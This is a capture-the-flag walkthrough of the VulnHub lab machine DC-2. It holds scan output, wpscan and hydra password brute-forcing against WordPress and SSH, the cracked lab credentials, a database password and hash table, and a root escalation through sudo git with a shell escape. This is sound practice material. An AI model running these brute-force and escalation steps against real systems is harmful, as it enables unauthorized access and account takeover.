# BOX NAME: DC-2 
**LINK**: https://www.vulnhub.com/entry/dc-2,311/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. DC-2. Website redirects to hostname dc-2. This seems to be a wordpress site. Let's damage it.
2. Well, it damaged us. No way in via wordpress found but tested for password reuse on obscured ssh-port (7744).
3. Breakout of restricted RBASH.
4. Look for flags.
5. pivot user and GTFO-bin with sudo command.

Great fun box with some little extra rbash challenges. I thought this was gonna be a kernel exploit or something like UserDefinedFunctions on mysql but nah.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.63
[+] URL:	http://dc-2
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-dc2.log      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 17:18 CEST
Nmap scan report for dc.local (10.77.0.63)
Host is up (0.00024s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds


└─$ nmap -p- $IP -oN nmap-allports-dc2.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 17:18 CEST
Nmap scan report for dc.local (10.77.0.63)
Host is up (0.00036s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  raqmon-pdu

Nmap done: 1 IP address (1 host up) scanned in 4.83 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
└─$ whatweb $URL --log-verbose=whatweb-dc2.log --follow-redirect=always
http://dc.local [301 Moved Permanently] Apache[2.4.10], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[10.77.0.63], RedirectLocation[http://dc-2/]
http://dc-2/ [200 OK] Apache[2.4.10], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[10.77.0.63], JQuery[1.12.4], MetaGenerator[WordPress 4.7.10], PoweredBy[WordPress], Script[text/javascript], Title[DC-2 &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.10]
```

nikto-scan

```
└─$ nikto -h $URL | tee nikto-dc2.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.63
+ Target Hostname:    dc.local
+ Target Port:        80
+ Start Time:         2023-04-30 16:46:31 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME ty
+ Root page / redirects to: http://dc-2/
+ /index.php?: Drupal Link header found with value: ARRAY(0x556756a91b90). See: https://www.drupal.org/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Co
+ /wp-login.php: Wordpress login found.
+ 7962 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2023-04-30 16:47:13 (GMT2) (42 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

fuzzing

```

```
wpscan
```
[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - jerry / adipiscing                                                                                      
[SUCCESS] - tom / parturient                                                                                        
Trying admin / log Time: 00:00:29 <=========================                    > (646 / 1122) 57.57%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

</details>
<details><summary><ins>OTHER</ins></summary>

SSH (Port 22)
```
PORT     STATE SERVICE VERSION
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

└─$ hydra -L usernames.txt -P cewl-wordlist.txt $IP ssh -s 7744 -t 4              
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-30 17:24:04
[DATA] max 4 tasks per 1 server, overall 4 tasks, 714 login tries (l:3/p:238), ~179 tries per task
[DATA] attacking ssh://10.77.0.63:7744/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 670 to do in 00:16h, 4 active
[STATUS] 33.67 tries/min, 101 tries in 00:03h, 613 to do in 00:19h, 4 active
[STATUS] 29.14 tries/min, 204 tries in 00:07h, 510 to do in 00:18h, 4 active
[7744][ssh] host: 10.77.0.63   login: tom   password: parturient

```

DNS (Port 53)
```

```

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**SUID's**:

```
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/procmail
/usr/bin/at
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/bin/umount
/bin/mount
/bin/su
```
**SGID's**:

```
/usr/bin/wall
/usr/bin/bsd-write
/usr/bin/chage
/usr/bin/ssh-agent
/usr/bin/expiry
/usr/bin/lockfile
/usr/bin/mutt_dotlock
/usr/bin/dotlockfile
/usr/bin/mlocate
/usr/bin/crontab
/usr/bin/procmail
/usr/bin/at
/sbin/unix_chkpwd
```
**OTHERS**:

```

```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
/bin/bash: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib, for GNU/Linux 2.6.32, BuildID[sha1]=0d49d8b80f1fb836969dca1aea93dc5f706dac75, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 8.11 (jessie)
Release:        8.11
Codename:       jessie


uname: invalid option -- '*'
Try 'uname --help' for more information.

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

admin:
tom:parturient			password reuse.
jerry:adipiscing		password reuse.
wpadmin:4uTiLL


/** MySQL database username */
define('DB_USER', 'wpadmin');
/** MySQL database password */
define('DB_PASSWORD', '4uTiLL');
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email                  | user_url | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | admin      | $P$BXC3GjdXdWYQbzZwQRv2hTo4XRtadY. | admin         | admin@notreallyanywhere.net |          | 2019-03-21 21:17:58 |                                               |           0 | admin        |
|  2 | tom        | $P$BxtBVzdeXeWoNQFW7unO11Qsp0lyTO. | tom           | tom@notreallyanywhere.net   |          | 2019-03-21 21:23:58 | 1553203439:$P$Bbc8tN.2UEk3NP2tZ0vWS9UbA/Z47y. |           0 | Tom Cat      |
|  3 | jerry      | $P$BRCcbpudGlBukTwA7kJsb.rafAL4il. | jerry         | jerry@notreallyanywhere.net |          | 2019-03-21 21:25:13 |                                               |           0 | Jerry Mouse  |
+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
Pivot to user jerry
	-> jerry may run /usr/bin/git with sudo privs.
		-> sudo /usr/bin/git -p help config
			-> !/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```
```
rbash breakout.
``` 
```
Flag 1:
Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
More passwords is always better, but sometimes you just can’t win them all.
Log in as one to see the next flag.
If you can’t find it, log in as another.
```
```
@jerry's pages on wordpress.
Flag 2:
If you can't exploit WordPress and take a shortcut, there is another way.
Hope you found another entry point.
```
```
flag3:
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```
```
flag4
Good to see that you've made it this far - but you're not home yet. 
You still need to get the final flag (the only flag that really counts!!!).  
No hints here - you're on your own now.  :-)
Go on - git outta here!!!!
``` 
``` 
# cat final-flag.txt
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7
```
</details>